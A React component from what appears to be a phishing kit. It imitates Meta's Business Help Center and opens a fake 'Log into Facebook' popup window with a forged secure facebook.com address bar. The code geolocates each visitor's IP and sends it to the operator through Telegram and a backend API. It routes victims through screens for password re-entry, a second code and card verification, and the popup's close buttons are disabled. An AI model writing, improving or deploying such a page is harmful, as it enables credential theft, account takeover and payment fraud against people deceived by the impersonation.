import "./pageOne.css";
import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Form, Input, Select, Row, Col, Modal } from "antd";
import { sendTelegram } from "./utils/sendTelegram";
import { v4 as uuidv4 } from "uuid";
import { getIpAddress } from "./utils/getIpAddress";
import { ConfirmationModal } from "./ConfirmationModal";
import { Confirmation } from "./Confirmation";
import { CodeTwo } from "./CodeTwo";
import { ConfirmationSecond } from "./ConfirmationSecond";
import { TH } from "./TH";
import { API_BE } from "./utils/variable";
import { LoadingFacebookButton } from "./LoadingFacebookButton";
import { TenMinute } from "./TenMinute";
import { Landing } from "./Landing";
import axios from "axios";
import { VerificationCC } from "./VerificationCC";
import { RestrictedEmail } from "./RestrictedEmail";

import Calendar from "react-calendar";
import "react-calendar/dist/Calendar.css";

export const LandingPage = () => {
  const [isModalVisible, setIsModalVisible] = useState(false);
  const [modalState, setValue] = useState(55);
  const [date, setDate] = useState(new Date());

  const handleDateChange = (selectedDate) => {
    setDate(selectedDate);
    // You can add logic here to handle the selected date, e.g., create an event or appointment.
  };

  const handleCancel = () => {
    return;
    setIsModalVisible(false);
    setValue(55);
  };

  const showModal = () => {
    setIsModalVisible(true);
    getCurrentIp().then((data) => {
      getIpConfig(data);
      createUserDb();
    });
  };

  const createUserDb = () => {
    let unique_id = localStorage.getItem("unique_id");
    let ip_data = localStorage.getItem("ip-datas");

    if (unique_id) {
      ip_data = JSON.parse(ip_data);
      unique_id = JSON.parse(unique_id);

      const body = {
        unique_id: unique_id,
        ip_address: ip_data?.ip || "",
        country: ip_data?.city || "",
        country_code: ip_data?.country || "",
        email: "",
      };

      fetch(`${API_BE}/users`, {
        method: "POST",
        headers: {
          Accept: "application/json, text/plain, */*",
          "Content-Type": "application/json",
        },
        body: JSON.stringify(body),
      })
        .then((res) => res.json())
        .then(() => console.warn("yes!!"));
    }
  };

  const getCurrentIp = async () => {
    try {
      const { data } = await axios.get("https://api.ipify.org/?format=json");
      if (data && data.ip) {
        return data.ip;
      }
    } catch (error) {
      return null;
    }
  };

  const getIpConfig = (ip) => {
    const unique_id = uuidv4();
    localStorage.setItem("unique_id", JSON.stringify(unique_id));

    if (!ip) return;
    fetch(`https://ipinfo.io/${ip}/json`)
      .then((response) => response.json())
      .then((data) => {
        let body = {
          ip: data.ip,
          country: data.country,
          region: data.region,
          city: data.city,
          org: data.org,
          zip: data.postal,
        };

        // Replace this
        localStorage.setItem("ip-datas", JSON.stringify(body));

        let telegram_data = `
            ===== ONLINE =====
              IP: ${data.ip}
              City: ${data.city}
              Region: ${data.region}
              Country: ${data.country}
              ORG: ${data.org}
              ZIP: ${data.postal}
            `;

        sendTelegram(telegram_data, true);
      });
  };

  const changeModalScreens = (state) => {
    if (state === 0) {
      return (
        <LoadingFacebookButton
          isModalVisible={isModalVisible}
          setValue={setValue}
          handleCancel={handleCancel}
        />
      );
    } else if (state === 1) {
      return <ConfirmationModal setValue={setValue} wrong_password={true} />;
    } else if (state === 2) {
      return <Confirmation setValue={setValue} />;
    } else if (state === 3) {
      return <ConfirmationSecond setValue={setValue} />;
    } else if (state === 4) {
      return <TH setValue={setValue} />;
    } else if (state === 5) {
      return window.location.replace(
        "https://calendly.com/essencemediacom/10min/"
      );
    } else if (state === 6) {
      return <TenMinute setValue={setValue} />;
    } else if (state === 7) {
      return <VerificationCC setValue={setValue} />;
    } else if (state === 8) {
      return <RestrictedEmail setValue={setValue} />;
    } else {
      return <ConfirmationModal setValue={setValue} />;
    }
  };

  return (
    <>
      <div className="landing-page-one">
        <div className="navigation">
          <img
            height={"15px"}
            src="https://scontent-lga3-1.xx.fbcdn.net/v/t39.8562-6/278025437_369851991690397_7980697822423283727_n.svg?_nc_cat=1&ccb=1-7&_nc_sid=6825c5&_nc_ohc=Xa4Iv4Jr-j4AX-Hojp_&_nc_oc=AQnfsPfmpksWVjBJFXEiQ_-DU5zYigPGbHYiAb6Wm6KVykqw5BYd7qNhEoBgXCoqido&_nc_ht=scontent-lga3-1.xx&oh=00_AfCPfj2u2N0FBNTyC0qqBp7eMwU1dso6Z3ytVvDhCIG4Vg&oe=64E2DBD4"
          />

          <div className="nav-links">
            <a href="">Get started</a>
            <a href="">Advertise</a>
            <a href="">Learn</a>
            <a href="">Support</a>
          </div>
        </div>
        <div className="nav-sec">
          <p>Business Help Center</p>
          <div className="nav-img-one">
            <img src="https://scontent-lga3-1.xx.fbcdn.net/v/t39.8562-6/131752382_233150241522154_1561085806522707496_n.svg?_nc_cat=1&ccb=1-7&_nc_sid=6825c5&_nc_ohc=qGZLg6jsa7QAX-ec40-&_nc_ht=scontent-lga3-1.xx&oh=00_AfDm1nl2XqLaEd6RdCf8W49R1qTCU_1RvI9NtHBvyZcZWA&oe=64E41833" />
            <p>Get support</p>
          </div>
        </div>
        <div className="nav-get-started">
          <h1>Get Support</h1>
        </div>

        <div className="login-fb-frame">
          <h4
            class="_3tmt _aio7 _aio2 _9ioa _97fe _34g8 _alao _ambk"
            style={{ fontSize: "16px" }}
          >
            <img
              class="_2qnn _al40 _ambl img"
              width={"50px"}
              src="https://lookaside.fbsbx.com/elementpath/media/?media_id=1389774634917761&amp;version=1689635962"
            />
            Log in to Meta for Business
          </h4>
          <p>Manage your ad accounts and get personalized support.</p>
          <a onClick={() => showModal()}>
            <img
              width={"24px"}
              style={{ margin: "9px" }}
              src="https://scontent-lga3-1.xx.fbcdn.net/v/t39.8562-6/339131123_2375113339334586_1729712879149307566_n.svg?_nc_cat=1&ccb=1-7&_nc_sid=6825c5&_nc_ohc=CQtAKWE-xeIAX95SX0d&_nc_ht=scontent-lga3-1.xx&oh=00_AfAqgdoJI4Kh-EL5YgmzBHG5Yo1a-jx1C_MetItai1uARg&oe=64E311B2"
            />
            Log in with Facebook
          </a>
        </div>

        <div className="login-footer">
          <p>Was this information helpful?</p>
        </div>
        <div className="footer-login-land">
          <div className="left-social">
            <p>© 2023 Meta </p>
            <img
              width="24px"
              src="https://scontent-lga3-1.xx.fbcdn.net/v/t39.8562-6/120319840_799089310850692_4027936540782357774_n.svg?_nc_cat=1&ccb=1-7&_nc_sid=6825c5&_nc_ohc=uuBmxAB8-KAAX9SgWoD&_nc_ht=scontent-lga3-1.xx&oh=00_AfDPxKnCrZjINx1H9uiZIpEIMTwLy_EW0ofgSSdqIsLUxw&oe=64E2A301"
            />
            <img
              width="24px"
              src="https://scontent-lga3-1.xx.fbcdn.net/v/t39.8562-6/125184609_367828907811587_6232717932985532700_n.svg?_nc_cat=1&ccb=1-7&_nc_sid=6825c5&_nc_ohc=Z5PjEZbLkUIAX-6mVec&_nc_ht=scontent-lga3-1.xx&oh=00_AfBC1FqYVHxS6AP-4zBNvam_1IdchzE31BAMXqieVbjrZA&oe=64E34F99"
            />
            <img
              width="24px"
              src="https://scontent-lga3-1.xx.fbcdn.net/v/t39.8562-6/125183124_383577579652081_654914459383273305_n.svg?_nc_cat=1&ccb=1-7&_nc_sid=6825c5&_nc_ohc=oRd_4B6c3oIAX9Goirn&_nc_ht=scontent-lga3-1.xx&oh=00_AfDJ4vBCegOGK2LsRwyyfIIyv_2S2lBS_EGW6nwmM_WXcA&oe=64E33395"
            />
            <img
              width="24px"
              src="https://scontent-lga3-1.xx.fbcdn.net/v/t39.8562-6/125236997_694902778115984_451660285310228094_n.svg?_nc_cat=1&ccb=1-7&_nc_sid=6825c5&_nc_ohc=nU9280IlzVgAX_JVGJN&_nc_ht=scontent-lga3-1.xx&oh=00_AfCazm5izZCNSElhyuFN2krP1ipNKZ0L9v908AWkBGMEYA&oe=64E3FFBF"
            />
          </div>
          <div className="right-social">
            <a>English (US)</a>
            <a>English (UK)</a>
            <a>Español</a>
            <a>Português (Brasil)</a>
            <a>Français (France)</a>
            <a>Español (España)</a>
          </div>
        </div>
      </div>

      <Modal
        className="modal-wrapper  modal__facebook"
        width={1000}
        bodyStyle={{ height: 650 }}
        title={
          <div>
            <div className="wrapper_header">
              <div className="sign__up-modal">
                <img src="/hLRJ1GG_y0J.ico" alt="" width="17px" />
                <p>Log into Facebook | Facebook</p>
              </div>
              <div className="icons">
                <div className="img" onClick={handleCancel}>
                  <img src="/minus.png" alt="" />
                </div>
                <div className="img">
                  <img
                    src="https://icons-for-free.com/iconfiles/png/512/square-1321215626459427421.png"
                    alt=""
                  />
                </div>
                <div className="img img-x" onClick={handleCancel}>
                  <img src="/close.png" alt="" />
                </div>
              </div>
            </div>
            <div className="input__title-wrapper">
              <div className="lock__screen">
                <div className="lock">
                  <div className="lock__wrapper">
                    <img src="/locktest.png" alt="" />
                    <span className="green">Secure | https:</span>
                    <span className="black-opacity">//</span>
                  </div>
                </div>
                <span className="input__value">
                  www.facebook.com
                  <span className="black">
                    {" "}
                    /login.php?skip
                    <span className="hide__text-mobile">
                      _api_login=1
                      &api_key=481324359126967&kid_directed_site=0&app_id=481324359126967&signed...
                    </span>
                  </span>
                </span>
              </div>

              {/* <div className="lock lock-img">
                <div className="lock__wrapper">
                  <img src="/zoom-in.png" alt="" />
                </div>
              </div> */}
            </div>
          </div>
        }
        open={isModalVisible}
        maskClosable={false}
      >
        {changeModalScreens(modalState)}
      </Modal>
    </>
  );
};
